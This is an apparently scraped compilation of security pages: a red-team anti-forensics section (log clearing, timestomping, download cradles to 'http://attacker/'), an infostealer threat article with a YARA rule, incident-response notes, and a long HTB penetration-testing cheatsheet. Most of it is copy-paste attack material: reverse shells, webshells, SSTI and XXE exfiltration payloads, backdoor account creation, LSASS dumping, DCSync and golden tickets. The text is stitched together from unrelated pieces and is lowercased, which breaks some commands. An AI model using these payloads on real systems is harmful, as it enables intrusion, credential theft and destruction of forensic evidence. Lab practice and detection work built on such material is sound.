# 6. generate report anti-forensics — red team perspective understanding what leaves traces — and how to minimise them — is core red team knowledge. every technique below has a forensic detection counterpart. # windows — clear event logs
# event id 1102 is generated when security log is cleared (itself logged in security log)
# event id 104 in system log when system log is cleared

# powershell (leaves event id 1102)
wevtutil cl security
wevtutil cl system
wevtutil cl application

# clear all logs
get-winevent -listlog * | where-object {$_.recordcount -gt 0} | foreach-object { wevtutil cl $_.logname }

# detection: 
# - gap in event ids (e.g., jump from 4xxx to 4yyy with missing sequence)
# - event id 1102 / 104 in siem before clearing takes effect
# - centralised logging (siem) captures before local clear

# linux — clear logs
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
history -c && unset histfile   # clear bash history in session
export histsize=0              # disable history for session

# detection:
# - log file size suddenly drops to 0
# - last-modified timestamp on log file
# - centralised syslog (rsyslog/logstash) already shipped logs remotely # windows — timestomp with meterpreter
meterpreter > timestomp c:\\malware.exe -m "01/01/2020 12:00:00"  # modified
meterpreter > timestomp c:\\malware.exe -a "01/01/2020 12:00:00"  # accessed
meterpreter > timestomp c:\\malware.exe -c "01/01/2020 12:00:00"  # created
meterpreter > timestomp c:\\malware.exe -e "01/01/2020 12:00:00"  # entry modified

# timestomp only modifies $standard_information timestamps
# $file_name timestamps in the mft are not modified
# forensic tell: $standard_information creation < $file_name creation = timestomped

# powershell timestomp
$file = get-item c:\malware.exe
$file.creationtime = "01/01/2020 12:00:00"
$file.lastwritetime = "01/01/2020 12:00:00"
$file.lastaccesstime = "01/01/2020 12:00:00"

# linux
touch -t 202001011200.00 /tmp/malware.elf   # set all timestamps
touch -d "2020-01-01 12:00:00" /tmp/malware.elf

# detection:
# - compare $standard_info vs $file_name timestamps (ntfs)
# - $usnjrnl and $logfile may still show real modification times
# - timeline gaps / impossible timestamps (file modified before os install)
# - file in prefetch but timestamp predates os installation # execute payload from memory only — no file written to disk
# powershell download cradle
iex (new-object net.webclient).downloadstring('http://attacker/payload.ps1')

# encoded command (avoids history in cleartext)
$cmd = 'iex (new-object net.webclient).downloadstring("http://attacker/p.ps1")'
$b64 = [convert]::tobase64string([system.text.encoding]::unicode.getbytes($cmd))
powershell.exe -encodedcommand $b64

# lsb steganography (manual)
python3 -c "
from pil import image
img = image.open('image.png')
pixels = list(img.getdata())
bits = [p[0] & 1 for p in pixels[:1000]]
bytes_ = [bits[i:i+8] for i in range(0,len(bits),8)]
print(''.join([chr(int(''.join(map(str,b)),2)) for b in bytes_ if 0 < int(''.join(map(str,b)),2) < 128]))
"

python3 vol.py -f challenge.vmem windows.cmdline
python3 vol.py -f challenge.vmem windows.malfind
python3 vol.py -f challenge.vmem windows.dumpfiles --dump   # dump all files from memory
strings challenge.vmem | grep -i 'flag\|ctf\|htb\|thm'

# ── exif / metadata ──
exiftool image.jpg
exiftool -a -u -g1 image.jpg      # all metadata groups
strings image.jpg | grep -i 'gps\|lat\|lon\|coord'

# ── zip password ──
zip2john challenge.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
7z x challenge.zip -p<password> incident response integration forensics and incident response (ir) are tightly coupled. the picerl framework maps forensic activities to each ir phase:

**preparation** — deploy endpoint logging (sysmon, edr, centralised siem), establish baselines, prepare forensic toolkits on usb.

**identification** — use edr/siem alerts, network anomalies, or user reports to identify an incident. determine scope.

**containment** — isolate affected systems (network isolation, account disable). preserve volatile data before containment.

**eradication** — forensic analysis to find all persistence mechanisms, lateral movement paths, and backdoors. remove all attacker footholds.

**recovery** — restore from clean backups, rebuild systems, verify integrity. monitor for re-infection.

**lessons learned** — timeline reconstruction, root cause analysis, improve defences. # kansa / kape / velociraptor — enterprise live response tools

# kape (kroll artifact parser and extractor) — windows
# collects and parses artefacts in minutes
kape.exe --tsource c: --tdest c:\kape_output --target !sans_triage --module !ezparser
# targets: filesystem artefacts to collect
# modules: parsing tools to run on collected artefacts

# manual rapid triage script (bash — linux)
#!/bin/bash
out=/tmp/triage_$(hostname)_$(date +%y%m%d_%h%m%s)
mkdir -p $out

# system info
uname -a > $out/uname.txt
date > $out/date.txt
uptime > $out/uptime.txt

# users
who > $out/who.txt
last -50 > $out/last.txt
cat /etc/passwd > $out/passwd.txt
cat /etc/shadow > $out/shadow.txt  # requires root

# processes
ps auxf > $out/ps.txt
ls -la /proc/*/exe 2>/dev/null > $out/proc_exe.txt

# network
ss -tnlp > $out/listening_ports.txt
ss -tnp > $out/connections.txt
arp -n > $out/arp.txt
ip route > $out/routes.txt

# files
find /tmp /var/tmp /dev/shm -type f > $out/suspicious_dirs.txt
find / -mtime -1 -type f 2>/dev/null | grep -v '/proc\|/sys\|/dev' > $out/recent_files.txt

# cron / persistence
crontab -l > $out/crontab_root.txt
ls -la /etc/cron* > $out/cron_dirs.txt
cat /etc/rc.local > $out/rc_local.txt
systemctl list-units --type=service > $out/services.txt

# logs (last 1000 lines)
tail -1000 /var/log/auth.log > $out/auth_log.txt
tail -1000 /var/log/syslog > $out/syslog.txt

# history
cat /root/.bash_history > $out/root_history.txt
for u in $(cut -d: -f1 /etc/passwd); do cp /home/$u/.bash_history $out/hist_$u.txt 2>/dev/null; done

tar czf /tmp/triage_$(hostname).tar.gz -c /tmp $(basename $out)
echo "triage complete: /tmp/triage_$(hostname).tar.gz" key tools reference

title: 36 Hours From Infostealer to Ransomware Staging — Cookies Beat MFA Every Time
summary: Infostealers like Lumma, Vidar, and Redline have matured into Initial Access Broker supply chains. 2026 telemetry shows a 36-hour path from a single unmanaged-d
body:
36 hours from infostealer to ransomware staging — cookies beat mfa every time infostealers like lumma, vidar, and redline have matured into initial access broker supply chains. 2026 telemetry shows a 36-hour path from a single unmanaged-device infection to a thwarted ransomware staging attempt — and the technique they use to beat mfa doesn't touch your password at all. news infostealer session-hijacking mfa-bypass initial-access lumma identity infostealers stopped being a credential-scraping nuisance some time ago. in 2026 telemetry, malware families like **lumma stealer**, **vidar**, and **redline** function as the harvesting front-end of a fully specialized supply chain feeding **initial access brokers (iabs)**. constella intelligence and flare research documented the kill chain's speed directly: an infection on a single unmanaged personal device can produce a dark-web marketplace listing within **48 hours**, followed by a vpn or sso access attempt from a ransomware affiliate **mere hours after that**. in one tracked incident, the time from initial lumma stealer infection to a thwarted ransomware staging attempt was **exactly 36 hours**. 16% of all infostealer infections analyzed by constella and flare in early 2026 contained enterprise sso credentials — meaning roughly one in six "just a personal malware infection" events on an unmanaged device is also, simultaneously, a corporate initial-access event. bypassing application-bound encryption modern chromium-based browsers protect locally stored session secrets with **application-bound encryption**, which calls into the windows **data protection api (dpapi)** to ensure that only the verified browser binary itself — not an arbitrary external process — can request decryption of stored cookies and tokens. on paper, this should stop an external stealer process cold.

it doesn't, because infostealers stopped calling the decryption api externally. instead, they inject a payload directly into a running, legitimate browser process thread using **process hollowing** or **thread hijacking**. because the decryption request now genuinely originates from inside the verified browser binary's own context, dpapi honours it — and the stealer reads out plaintext session cookies from inside the very process the protection was designed to trust. session abuse: how cookies beat mfa the stolen cookies don't get used the way a stolen password would. they're bundled into a "log" and sold or handed to an iab or ransomware affiliate, who imports them directly into an **anti-detect browser** — tooling built specifically to replay a session with the matching device fingerprint, timezone, and browser characteristics the cloud provider originally observed.

when that session is replayed against microsoft entra id, google workspace, or okta, the identity provider sees a completely valid, already-authenticated session token. there is no password to check and no mfa challenge to issue, because — as far as the identity provider can tell — authentication already happened. the attacker is inside the tenant without ever triggering the control that the organization spent a budget cycle deploying specifically to stop this. detection engineering: yara rule the following targets the memory-injection signature characteristic of infostealers attempting to decrypt chromium's application-bound secrets from inside a legitimate browser process — the technique described above, not a password-scraping variant. rule infostealer_chromium_memory_injection {
    meta:
        description = "detects strings and execution signatures characteristic of memory injection used by infostealers to decrypt chromium application-bound secrets."
        author      = "threat research & intelligence"
        date        = "2026-06-17"
        version     = "1.1"

    strings:
        // core target application markers
        $browser_state  = "local state" nocase
        $chrome_cookies = "network/cookies" nocase
        $dpapi_call     = "cryptunprotectdata"

        // target executable strings
        $target_binary_1 = "chrome.exe" nocase
        $target_binary_2 = "msedge.exe" nocase

        // windows api strings indicative of process memory injection
        $winapi_1 = "virtualallocex"
        $winapi_2 = "writeprocessmemory"
        $winapi_3 = "resumethread"

    condition:
        uint16(0) == 0x5a4d and
        (all of ($browser_state, $chrome_cookies, $dpapi_call)) and
        (1 of ($target_binary_*)) and
        (all of ($winapi_*))
} defensive strategy **1. continuous access evaluation (cae).** stop treating authentication as a one-time event. enforce policies that evaluate live session characteristics — if a session's geographic location, asn, or device posture shifts abruptly mid-session, invalidate it immediately rather than waiting for token expiry.

**2. device compliance as a hard gate.** conditional access should require a corporate-managed device certificate or active edr telemetry before granting access to enterprise data resources, regardless of how valid the presented session token looks. an unmanaged personal device should never be a viable path to a corporate sso session in the first place.

**3. rapid session invalidation as a first-class incident response action.** the moment credential-stuffing or stealer-log exposure is suspected for a given user, revoking active sessions should be faster and more automatic than resetting a password — the password was never the part that mattered here. simulating a breach via purchased or simulated stealer logs — starting from "attacker has a valid session cookie" rather than "attacker has a phished password" — is a far more realistic emulation of how a modern ransomware affiliate actually gets in. if your engagement scope allows it, testing whether the client's identity provider rejects a replayed session with a clearly mismatched device fingerprint or asn is one of the highest-signal checks you can run.

sources: constella intelligence and flare research, early-2026 telemetry on infostealer-to-iab kill chain timing and enterprise sso credential exposure rates.

title: HTB Complete Cheatsheet
summary: Complete command reference for HTB machines — recon, web, shells, Linux/Windows privesc, Active Directory, pivoting. Easy to Insane.
body:
htb complete cheatsheet complete command reference for htb machines — recon, web, shells, linux/windows privesc, active directory, pivoting. easy to insane. notes htb cheatsheet pentest privesc ad a living reference for htb machines from easy to insane.
covers every phase: recon → foothold → privesc → post-exploitation.
commands are copy-paste ready — replace `$target`, `$lhost`, `$user`, `$pass`. reconnaissance port scanning # fast full-port sweep first, then deep scan on open ports
nmap -p- --min-rate 10000 -oa nmap/allports $target
nmap -sc -sv -p$(cat nmap/allports.gnmap | grep open | grep -op '\d+/open' | cut -d/ -f1 | tr '\n' ',') -oa nmap/targeted $target

# udp — slower, do top 200
nmap -su --top-ports 200 -oa nmap/udp $target

# firewall-evasion / fragmented
nmap -ss -t2 -f --mtu 24 -p- $target service-specific enumeration # ftp  (21) — check anon login
ftp $target          # user: anonymous  pass: anything
nmap --script ftp-anon,ftp-bounce $target -p 21

# ssh  (22)
ssh-audit $target

# smtp (25/587)
nmap --script smtp-enum-users,smtp-vrfy,smtp-commands $target -p 25
smtp-user-enum -m vrfy -u /usr/share/wordlists/metasploit/unix_users.txt -t $target

# dns  (53) — zone transfer
dig axfr @$target domain.htb
dnsenum --dnsserver $target --enum domain.htb

# http/s (80/443) — see web section

# snmp (161 udp)
onesixtyone -c /usr/share/seclists/discovery/snmp/snmp.txt $target
snmpwalk -v2c -c public $target 1.3.6 | head -40

# smb  (139/445) — see smb section
# ldap (389/636) — see ad section
# winrm (5985) — evil-winrm if creds known
evil-winrm -i $target -u $user -p $pass smb enumeration # anonymous / guest enum
smbclient -l //$target -n
smbmap -h $target
crackmapexec smb $target --shares -u '' -p ''

# with creds
crackmapexec smb $target -u $user -p $pass --shares --users --groups
smbclient //$target/sharename -u $user

# vuln checks
nmap --script smb-vuln* $target -p 445
crackmapexec smb $target -u '' -p '' --pass-pol

# mount share locally
sudo mount -t cifs //$target/sharename /mnt/smb -o user=$user,pass=$pass ldap / active directory pre-auth # anonymous ldap dump
ldapsearch -x -h ldap://$target -b "dc=domain,dc=htb"
ldapsearch -x -h ldap://$target -b "dc=domain,dc=htb" "(objectclass=user)" samaccountname

# with creds
ldapdomaindump ldap://$target -u 'domain\$user' -p $pass -o /tmp/ldap/

# windapsearch
windapsearch.py -d domain.htb --dc-ip $target -u '' --users
windapsearch.py -d domain.htb --dc-ip $target -u $user@domain.htb -p $pass --da nfs showmount -e $target
sudo mount -t nfs $target:/share /mnt/nfs -o nolock
# check for root_squash = no → write as root web application directory & file fuzzing # ffuf — fast, flexible
ffuf -u http://$target/fuzz -w /usr/share/seclists/discovery/web-content/raft-medium-words.txt -mc 200,204,301,302,307,401,403 -t 50
ffuf -u http://$target/fuzz -w /usr/share/seclists/discovery/web-content/raft-medium-words.txt -e .php,.txt,.html,.bak,.zip,.tar.gz -mc all -fc 404

# extensions on found dirs
ffuf -u http://$target/admin/fuzz -w /usr/share/seclists/discovery/web-content/raft-small-files.txt

# vhost / subdomain fuzzing
ffuf -u http://$target -h "host: fuzz.domain.htb" -w /usr/share/seclists/discovery/dns/subdomains-top1million-20000.txt -fw 10

# gobuster
gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
gobuster dns -d domain.htb -r $target -w /usr/share/seclists/discovery/dns/subdomains-top1million-5000.txt

# feroxbuster (recursive)
feroxbuster -u http://$target -w /usr/share/seclists/discovery/web-content/raft-medium-words.txt --auto-tune parameter & value fuzzing # get parameter fuzzing
ffuf -u "http://$target/page.php?fuzz=test" -w /usr/share/seclists/discovery/web-content/burp-parameter-names.txt -fw 10

# post body fuzzing
ffuf -u http://$target/login -x post -d "fuzz=admin&pass=test" -w /usr/share/seclists/discovery/web-content/burp-parameter-names.txt -fw 10

# value fuzzing (e.g. idor)
ffuf -u "http://$target/user?id=fuzz" -w <(seq 1 5000) -mc 200 lfi / path traversal # manual checks
curl "http://$target/page.php?file=../../../../etc/passwd"
curl "http://$target/page.php?file=....//....//etc/passwd"   # bypass filter
curl "http://$target/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd"
curl "http://$target/page.php?file=data://text/plain;base64,pd9wahagc3lzdgvtkcrfr0vuwydjbwqnxsk7pz4="

# useful files (linux)
# /etc/passwd  /etc/shadow  /etc/hosts  /proc/net/tcp
# /home/$user/.ssh/id_rsa  /var/log/apache2/access.log (log poison)
# /proc/self/environ  /proc/self/cmdline

# log poisoning → rce
curl -a "<?php system(\$_get['cmd']); ?>" http://$target/   # poison ua in log
curl "http://$target/page.php?file=/var/log/apache2/access.log&cmd=id"

# lfi wordlist
ffuf -u "http://$target/page.php?file=fuzz" -w /usr/share/seclists/fuzzing/lfi/lfi-jhaddix.txt -fw 10 sql injection # manual test — add ' or " to any parameter
curl "http://$target/item.php?id=1'"

# sqlmap — crawl and test everything
sqlmap -u "http://$target/item.php?id=1" --batch --level=3 --risk=2
sqlmap -u "http://$target/item.php?id=1" --batch --dbs
sqlmap -u "http://$target/item.php?id=1" -d dbname --tables
sqlmap -u "http://$target/item.php?id=1" -d dbname -t users --dump

# post form
sqlmap -u "http://$target/login" --data="user=admin&pass=test" --batch

# with cookie session
sqlmap -u "http://$target/dashboard" --cookie="session=token" --batch --os-shell

# time-based blind
sqlmap -u "http://$target/api/user" --technique=t --level=5 --risk=3 --batch ssti (server-side template injection) # probe — inject into every input field
{{7*7}}        # jinja2/twig → 49
${7*7}         # freemarker/velocity
<%= 7*7 %>     # erb (ruby)
#{7*7}         # ruby

# jinja2 rce
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=true,stdout=-1).communicate()}}

# freemarker rce
<#assign ex="freemarker.template.utility.execute"?new()>${ex("id")}

# twig rce
{{_self.env.registerundefinedfiltercallback("exec")}}{{_self.env.getfilter("id")}} file upload bypass # try these bypasses in order:
# 1. extension — rename shell.php → shell.php5 / .phtml / .phar / .shtml
# 2. mime type — intercept and change content-type to image/jpeg
# 3. magic bytes — prepend png
 to php shell content
# 4. double extension — shell.jpg.php / shell.php.jpg (server-side split)
# 5. null byte — shell.php%00.jpg  (older php)
# 6. case — shell.php

# minimal php webshell
echo '<?php system($_get["cmd"]); ?>' > shell.php

# test if executed
curl "http://$target/uploads/shell.php?cmd=id"

# full pty reverse shell via webshell
curl "http://$target/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/4444+0>%261'"" xxe (xml external entity) # classic — read files
<?xml version="1.0"?>
<!doctype root [<!entity xxe system "file:///etc/passwd">]>
<root><data>&xxe;</data></root>

# blind oob — exfil via dns/http (use collaborator or interactsh)
<!doctype root [<!entity % dtd system "http://attacker/evil.dtd"> %dtd;]>

# evil.dtd on attacker server:
<!entity % file system "file:///etc/shadow">
<!entity % ooband "<!entity exfil system 'http://attacker/?d=%file;'>">
%ooband; &exfil; ssrf (server-side request forgery) # basic probe
curl "http://$target/fetch?url=http://127.0.0.1/"
curl "http://$target/fetch?url=http://169.254.169.254/latest/meta-data/"  # aws

# bypass filters
http://0.0.0.0/          # equivalent to 127.0.0.1
http://[::]:80/
http://localhost%09/      # tab bypass
http://127.1/            # shorthand

# probe internal services
for port in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do
  curl -s "http://$target/fetch?url=http://127.0.0.1:$port" -o /dev/null -w "$port: %{http_code}\n"
done getting a shell reverse shell one-liners # set up listener first
rlwrap nc -lvnp 4444

# bash
bash -c 'bash -i >& /dev/tcp/$lhost/4444 0>&1'
bash -c 'bash -i >& /dev/tcp/$lhost/4444 0>&1' | base64  # b64 encode for url

# python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$lhost",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# php
php -r '$sock=fsockopen("$lhost",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# perl
perl -e 'use socket;$i="$lhost";$p=4444;socket(s,pf_inet,sock_stream,getprotobyname("tcp"));connect(s,sockaddr_in($p,inet_aton($i)));stdin->fdopen(s,r);$~->fdopen(s,w);system$_ while<>;'

# powershell
$c=new-object net.sockets.tcpclient("$lhost",4444);$s=$c.getstream();[byte[]]$b=0..65535|%{0};while(($i=$s.read($b,0,$b.length)) -ne 0){$d=(new-object text.asciiencoding).getstring($b,0,$i);$r=(iex $d 2>&1|out-string);$e=$r+"ps "+(pwd)+">";$eb=[text.encoding]::ascii.getbytes($e);$s.write($eb,0,$eb.length)}

# nc without -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $lhost 4444 > /tmp/f use https://www.revshells.com for auto-generated shells in every language. always url-encode when injecting via get parameters. shell upgrade (tty) # step 1 — spawn pty
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or: script /dev/null -c bash

# step 2 — background nc, fix terminal
ctrl+z
stty raw -echo; fg

# step 3 — set terminal size
export term=xterm-256color
stty rows 50 columns 220

# socat (better option — full interactive from the start)
# attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:4444 file transfer # ── python http server (attacker) ──────────────────────────────────────────
python3 -m http.server 8000

# ── download on linux ───────────────────────────────────────────────────────
wget http://$lhost:8000/file -o /tmp/file
curl http://$lhost:8000/file -o /tmp/file

# ── download on windows ─────────────────────────────────────────────────────
certutil -urlcache -split -f http://$lhost:8000/file c:\windows\temp\file
iwr http://$lhost:8000/file -outfile c:\windows\temp\file
(new-object net.webclient).downloadfile("http://$lhost:8000/file","c:\temp\file")

# ── smb share (impacket) — great for windows ────────────────────────────────
impacket-smbserver share $(pwd) -smb2support -user user -password pass
# on windows victim:
# net use z: \$lhost\share /user:user pass
# copy z: ile c:\windows\temp
# ── base64 copy-paste ───────────────────────────────────────────────────────
base64 -w0 file.bin             # attacker — output single line
# victim:
echo "base64string" | base64 -d > file.bin linux privilege escalation manual enumeration checklist # who am i / what can i do
id; whoami
sudo -l                            # key: nopasswd entries
cat /etc/sudoers 2>/dev/null

# suid binaries (check gtfobins.github.io)
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# capabilities
getcap -r / 2>/dev/null            # python3 cap_setuid=+eip → instant root

# writable directories / files
find / -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | grep -v "^/dev"
find / -writable -type d 2>/dev/null

# cron jobs
cat /etc/crontab; ls /etc/cron*
crontab -l
cat /var/spool/cron/crontabs/* 2>/dev/null
# watch for running processes using pspy
./pspy64

# path hijacking (check if cron script calls binary without full path)
echo $path
export path=/tmp:$path
echo '#!/bin/bash
bash -i >& /dev/tcp/$lhost/4444 0>&1' > /tmp/service
chmod +x /tmp/service

# interesting files
cat /etc/passwd | grep -v nologin | grep -v false
ls -la /home/*
cat ~/.bash_history 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password\|pass\|secret" 2>/dev/null

# running services / open ports (internal)
ss -tlnp; netstat -tlnp
ps aux

# docker / lxc
id | grep docker
find / -name docker.sock 2>/dev/null

# kernel version
uname -r
# searchsploit "linux kernel 5.4" — but dirty-pipe / dirtycow etc automated tools # linpeas — best all-in-one
curl -l https://github.com/carlospolop/peass-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null
# or transfer and run:
./linpeas.sh -a 2>/dev/null | tee /tmp/linpeas.out

# linenum
./linenum.sh -t 2>/dev/null

# pspy — monitor processes without root (catches cron, scripts)
chmod +x pspy64 && ./pspy64

# linux-exploit-suggester
./linux-exploit-suggester.sh common techniques # ── suid via gtfobins ──────────────────────────────────────────────────────
# find on gtfobins for the specific binary. examples:
/usr/bin/find . -exec /bin/sh -p \; -quit          # find suid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'   # python cap_setuid
# vim: :!/bin/bash

# ── sudo -l exploitation ────────────────────────────────────────────────────
# (all) nopasswd: /usr/bin/vim
sudo vim -c '!bash'
# (all) nopasswd: /usr/bin/python3 /opt/script.py  (writable script)
echo 'import os; os.system("bash")' >> /opt/script.py

# ── writable /etc/passwd ────────────────────────────────────────────────────
openssl passwd -1 -salt salt hacked      # generate hash
echo 'hacked:$1$salt$hash:0:0::/root:/bin/bash' >> /etc/passwd
su hacked

# ── nfs no_root_squash ──────────────────────────────────────────────────────
showmount -e $target          # attacker
sudo mount -t nfs $target:/ /mnt/nfs
sudo cp /bin/bash /mnt/nfs/tmp/bash
sudo chmod +s /mnt/nfs/tmp/bash
# victim:
/tmp/bash -p

# ── ld_preload (if sudo env_keep allows it) ─────────────────────────────────
cat > /tmp/privesc.c << 'eof'
#include <stdio.h>
#include <stdlib.h>
void _init() { setuid(0); setgid(0); system("/bin/bash"); }
eof
gcc -shared -fpic -nostartfiles -o /tmp/privesc.so /tmp/privesc.c
sudo ld_preload=/tmp/privesc.so program

# ── logrotate race (cve-2016-1247 style) ────────────────────────────────────
# if logrotate runs as root and you can write to the log dir — use logrotten windows privilege escalation initial enumeration # basic info
whoami /all
net user %username%
net localgroup administrators
systeminfo | findstr /b /c:"os" /c:"system type"
wmic qfe list brief                  # installed patches — look for missing ones

# network
ipconfig /all
netstat -ano
route print

# running services / processes
tasklist /svc
sc query
get-service | where-object {$_.status -eq "running"}

# interesting files
dir /s /b c:\users\*password* 2>/dev/null
dir /s /b c:\users\*cred* 2>/dev/null
type c:\windows\system32\drivers\etc\hosts
dir /s /b c:\*.txt c:\*.xml c:\*.ini 2>/dev/null | findstr /i "pass user admin"

# stored credentials
cmdkey /list
# run stored cred:
runas /savecred /user:domain\user cmd.exe

# registry creds
reg query hklm /f password /t reg_sz /s 2>/dev/null
reg query "hkcu\software\orl\winvnc3\password" 2>/dev/null
reg query "hklm\system\currentcontrolset\services\snmp" /s 2>/dev/null

# alwaysinstallelevated (both keys must be 1 → instant system)
reg query hkcu\software\policies\microsoft\windows\installer /v alwaysinstallelevated
reg query hklm\software\policies\microsoft\windows\installer /v alwaysinstallelevated
msfvenom -p windows/x64/shell_reverse_tcp lhost=$lhost lport=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi token abuse (seimpersonateprivilege) # check if you have seimpersonate or seassignprimarytoken
whoami /priv

# printspoofer (windows 2019, 10)
.\printspoofer.exe -i -c cmd

# godpotato (universal, 2012-2022)
.\godpotato.exe -cmd "cmd /c whoami"
.\godpotato.exe -cmd "cmd /c net user hacker pass123! /add && net localgroup administrators hacker /add"

# juicypotato (older windows, need clsid)
.\juicypotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t * -c {clsid}

# sweetpotato
.\sweetpotato.exe -p "cmd.exe" -a "/c net user hacker pass123! /add"

# roguepotato (when dcom not available locally) service / dll exploits # unquoted service paths
wmic service get name,pathname | findstr /i /v "c:\windows\\" | findstr /i /v "\"" 
# if "c:\program files\my app\service.exe" and you can write to c:\program.exe → hijack

# weak service permissions (you can change the binary path)
.ccesschk.exe -uwcqv "authenticated users" * /accepteula 2>/dev/null
sc config vulnsvc binpath= "cmd /c net user hacker pass123! /add"
sc start vulnsvc

# dll hijacking — find missing dlls
# run process monitor (procmon) with filter: result=name not found and path ends .dll
# drop malicious dll into writable search-path directory
msfvenom -p windows/x64/shell_reverse_tcp lhost=$lhost lport=4444 -f dll -o hijacked.dll automated — winpeas & others # winpeas — upload and run
.\winpeas.exe log                     # logs to file
.\winpeas.exe quiet cmd fast          # fast mode

# powerup.ps1
. .\powerup.ps1
invoke-allchecks

# seatbelt — focused checks
.\seatbelt.exe -group=all -full

# sharpup
.\sharpup.exe audit active directory enumeration # bloodhound — best ad overview (run sharphound collector first)
.\sharphound.exe -c all --zipfilename loot.zip
# from linux with creds:
bloodhound-python -d domain.htb -u $user -p $pass -ns $target -c all

# start bloodhound
sudo neo4j start && bloodhound &
# upload zip → run "shortest paths to domain admins"

# ldapdomaindump (clean html reports)
ldapdomaindump -u 'domain\$user' -p $pass ldap://$target -o /tmp/ldap

# enum4linux-ng
enum4linux-ng -a -u $user -p $pass $target

# crackmapexec
crackmapexec smb $target -u $user -p $pass --users
crackmapexec smb $target -u $user -p $pass --groups
crackmapexec smb $target -u $user -p $pass --pass-pol
crackmapexec smb $target -u $user -p $pass --rid-brute

# powerview (in-memory)
import-module .\powerview.ps1
get-netuser | select samaccountname,description,memberof
get-netgroup "domain admins" -fulldata
get-netcomputer | select name,operatingsystem
find-localadminaccess                 # where can user run as local admin kerberoasting # getuserspns — request tgs for spn-bearing accounts, crack offline
impacket-getuserspns domain.htb/$user:$pass -dc-ip $target -request
impacket-getuserspns domain.htb/$user:$pass -dc-ip $target -request -outputfile hashes.kerb

# from windows
.\rubeus.exe kerberoast /outfile:hashes.kerb /format:hashcat

# crack
hashcat -m 13100 hashes.kerb /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 hashes.kerb /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule as-rep roasting # works when dont_require_preauth is set on an account
# no creds needed — just a username list
impacket-getnpusers domain.htb/ -usersfile users.txt -dc-ip $target -format hashcat
impacket-getnpusers domain.htb/$user:$pass -dc-ip $target -request -format hashcat

# from windows
.\rubeus.exe asreproast /format:hashcat /outfile:hashes.asrep

# crack
hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt --force pass-the-hash / pass-the-ticket # pass-the-hash (ntlm) — no need to crack, use hash directly
crackmapexec smb $target -u $user -h $hash --exec-method smbexec
impacket-psexec domain.htb/$user@$target -hashes :$hash
impacket-wmiexec domain.htb/$user@$target -hashes :$hash
evil-winrm -i $target -u $user -h $hash

# pass-the-ticket (kerberos)
# export tickets from windows memory
.\rubeus.exe dump /nowrap           # or mimikatz: sekurlsa::tickets /export
# import on attacker (linux)
export krb5ccname=/tmp/ticket.ccache
impacket-psexec -k -no-pass domain.htb/user@host.domain.htb

# overpass-the-hash (ntlm → kerberos tgt)
.\rubeus.exe asktgt /user:$user /rc4:$hash /ptt dcsync — dump all hashes # requires replication rights (da, backup operators, etc.)
impacket-secretsdump domain.htb/$user:$pass@$target -just-dc-ntlm
impacket-secretsdump domain.htb/$user:$pass@$target -just-dc

# from windows (mimikatz)
lsadump::dcsync /domain:domain.htb /all /csv
lsadump::dcsync /domain:domain.htb /user:administrator

# use administrator hash for pth
impacket-psexec domain.htb/administrator@$target -hashes :$admin_hash golden / silver tickets # golden ticket — requires krbtgt ntlm hash (post-dcsync)
impacket-ticketer -nthash $krbtgt_hash -domain-sid $domain_sid -domain domain.htb administrator
export krb5ccname=/tmp/administrator.ccache
impacket-psexec -k -no-pass domain.htb/administrator@dc.domain.htb

# silver ticket — service-specific, requires service account hash
impacket-ticketer -nthash $service_hash -domain-sid $domain_sid -domain domain.htb -spn cifs/server.domain.htb user

# get domain sid
impacket-lookupsid domain.htb/$user:$pass@$target | grep "domain sid"

# mimikatz golden ticket
kerberos::golden /user:administrator /domain:domain.htb /sid:$sid /krbtgt:$hash /id:500 /ptt lateral movement # common exec methods (ordered by noise level, quietest first)
evil-winrm -i $target -u $user -p $pass          # winrm 5985 — least noisy
impacket-wmiexec domain/$user:$pass@$target       # wmi
impacket-smbexec domain/$user:$pass@$target       # scm over smb
impacket-psexec domain/$user:$pass@$target        # noisiest, creates service

# crackmapexec spray + exec
crackmapexec smb $subnet/24 -u $user -p $pass     # check where creds work
crackmapexec smb $target -u $user -p $pass -x "whoami"   # cmd execution
crackmapexec smb $target -u $user -p $pass -x "get-process" # ps execution

# dump lsass (requires local admin)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
# or:
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp   # exfil and parse offline
# on attacker: impacket-secretsdump -system system -ntds lsass.dmp local password cracking # identify hash type
hashid '$1$abc$hash'               # local tool
haiti '$1$abc$hash'                # better tool
# or check hashcat example hashes: https://hashcat.net/wiki/doku.php?id=example_hashes

# hashcat — gpu cracking
hashcat -a 0 -m 0    hash.txt /usr/share/wordlists/rockyou.txt          # md5 dict
hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt          # ntlm dict
hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt          # sha512crypt
hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt          # bcrypt (slow)
